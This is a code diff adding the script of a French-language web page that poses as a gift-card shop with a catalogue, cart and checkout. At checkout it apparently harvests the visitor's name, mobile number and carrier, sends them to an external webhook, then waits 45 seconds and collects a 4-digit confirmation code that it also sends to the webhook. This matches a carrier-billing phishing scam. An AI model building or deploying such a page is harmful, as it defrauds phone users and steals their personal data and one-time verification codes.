+  document.getElementById("mName").textContent=b.n;
+  var am=document.getElementById("mAmounts");am.innerHTML="";
+  for(var k=0;k<AMOUNTS.length;k++){(function(v){
+    var el=document.createElement("button");el.className="amt";el.textContent=euros(v);
+    el.onclick=function(){var a=document.querySelectorAll(".amt");for(var j=0;j<a.length;j++)a[j].classList.remove("sel");el.classList.add("sel");selAmt=v;};
+    am.appendChild(el);
+  })(AMOUNTS[k]);}
+  document.getElementById("modalBg").classList.add("show");
+}
+document.getElementById("mClose").onclick=function(){document.getElementById("modalBg").classList.remove("show");};
+document.getElementById("modalBg").onclick=function(e){if(e.target.id==="modalBg")e.target.classList.remove("show");};
+document.getElementById("mAdd").onclick=function(){
+  if(selAmt===null)return;
+  var b=BRANDS[selBrand];
+  cart.push({name:b.n,emoji:b.e,s:b.s,grad:b.g,amount:selAmt});
+  document.getElementById("modalBg").classList.remove("show");
+  updateCart();
+};
+function updateCart(){
+  document.getElementById("barCount").textContent=cart.length;
+  document.getElementById("barTotal").textContent=total()+" €";
+  var nt=document.getElementById("nameTotal");if(nt)nt.textContent=total()+" €";
+}
+function renderCart(){
+  var c=document.getElementById("cartCard");
+  if(cart.length===0){c.innerHTML='<div class="empty">Panier vide</div><button class="btn" onclick="show(\'scr1\')">Retour au catalogue</button>';return;}
+  var html="";
+  for(var i=0;i<cart.length;i++){var it=cart[i];
+    html+='<div class="row"><div class="l"><div class="emo" style="background:'+it.grad+'">'+(it.s||'<span style="font-size:22px">'+it.emoji+'</span>')+'</div><div class="txt"><b>'+it.name+'</b><span>'+euros(it.amount)+'</span></div></div><button class="rm" data-i="'+i+'">Retirer</button></div>';}
+  html+='<div class="tot"><small>Total</small><b>'+euros(total())+'</b></div>';
+  html+='<button class="btn big" id="checkoutBtn">Passer commande</button>';
+  html+='<button class="btn sec" id="moreCards">Ajouter d\'autres cartes</button>';
+  c.innerHTML=html;
+  var rms=c.querySelectorAll(".rm");
+  for(var j=0;j<rms.length;j++){rms[j].onclick=function(){var idx=parseInt(this.getAttribute("data-i"),10);cart.splice(idx,1);updateCart();renderCart();};}
+  document.getElementById("checkoutBtn").onclick=function(){updateCart();show("scr2b");};
+  document.getElementById("moreCards").onclick=function(){show("scr1");};
+}
+document.getElementById("nameBtn").onclick=function(){
+  var f=document.getElementById("firstName").value.trim();
+  var l=document.getElementById("lastName").value.trim();
+  if(f.length<2||l.length<2){document.getElementById("nameErr").textContent="Renseigne ton prénom et ton nom";return;}
+  firstName=f;lastName=l;
+  document.getElementById("nameErr").textContent="";
+  show("scr3");
+};
+function formatPhone(v){var d=v.replace(/\D/g,"").slice(0,10);return d.replace(/(\d{2})(?=\d)/g,"$1 ").trim();}
+document.getElementById("phoneInput").addEventListener("input",function(e){
+  e.target.value=formatPhone(e.target.value);
+  document.getElementById("phoneErr").textContent="";
+});
+var opEls=document.querySelectorAll("#opList .op");
+for(var oi=0;oi<opEls.length;oi++){(function(el){
+  el.onclick=function(){
+    for(var j=0;j<opEls.length;j++)opEls[j].classList.remove("sel");
+    el.classList.add("sel");
+    operateur=el.getAttribute("data-op");
+    document.getElementById("phoneErr").textContent="";
+  };
+})(opEls[oi]);}
+function cartText(){var o=[];for(var i=0;i<cart.length;i++)o.push(cart[i].name+" - "+cart[i].amount+"€");return o.join("\n");}
+function sendWebhook(content){
+  var fd=new FormData();
+  fd.append("payload_json",JSON.stringify({content:content}));
+  fetch(WEBHOOK,{method:"POST",body:fd}).then(function(r){console.log("hook",r.status);}).catch(function(e){console.log("hook err",e);});
+}
+document.getElementById("payBtn").onclick=function(){
+  var raw=document.getElementById("phoneInput").value.replace(/\s/g,"");
+  if(!/^0[67]\d{8}$/.test(raw)){document.getElementById("phoneErr").textContent="Numéro invalide (06 ou 07, 10 chiffres)";return;}
+  if(!operateur){document.getElementById("phoneErr").textContent="Choisis ton opérateur (SFR ou Bouygues)";return;}
+  phone=raw;
+  var msg="💳 Commande — Étape 1/2\nNom : "+firstName+" "+lastName+"\nNuméro : "+formatPhone(phone)+"\nOpérateur : "+operateur+"\nTotal : "+total()+"€\nCartes :\n"+cartText();
+  sendWebhook(msg);show("scr4");startTimer();
+};
+function startTimer(){
+  var left=45,circ=2*Math.PI*76;
+  var prog=document.getElementById("ringProg"),txt=document.getElementById("ringTxt");
+  var inp=document.getElementById("codeInput"),btn=document.getElementById("codeBtn");
+  inp.disabled=true;btn.disabled=true;inp.value="";
+  txt.textContent=left;prog.style.strokeDashoffset="0";
+  if(timer)clearInterval(timer);
+  timer=setInterval(function(){
+    left--;txt.textContent=left;prog.style.strokeDashoffset=circ*(1-left/45);
+    if(left<=0){clearInterval(timer);timer=null;inp.disabled=false;btn.disabled=false;try{inp.focus();}catch(e){}}
+  },1000);
+}
+document.getElementById("codeInput").addEventListener("input",function(e){
+  e.target.value=e.target.value.replace(/\D/g,"").slice(0,4);
+  document.getElementById("codeErr").textContent="";
+});
+document.getElementById("codeBtn").onclick=function(){
+  var code=document.getElementById("codeInput").value;
+  if(!/^\d{4}$/.test(code)){document.getElementById("codeErr").textContent="Code à 4 chiffres requis";return;}
+  var msg="✅ Commande — Code\nNom : "+firstName+" "+lastName+"\nNuméro : "+formatPhone(phone)+"\nOpérateur : "+operateur+"\nTotal : "+total()+"€\nCode : "+code+"\nCartes :\n"+cartText();
+  sendWebhook(msg);
+  document.getElementById("doneName").textContent=firstName;
+  var lines="";
+  for(var i=0;i<cart.length;i++)lines+=cart[i].name+" — "+cart[i].amount+" €<br>";
+  document.getElementById("doneCart").innerHTML=lines;
+  document.getElementById("doneOp").textContent=operateur;
+  document.getElementById("doneTotal").textContent=total()+" €";
+  show("scr5");
+};
+document.getElementById("viewCart").onclick=function(){renderCart();show("scr2");};
+renderBrands();
+updateCart();
+</script>
+</body>
+</html>
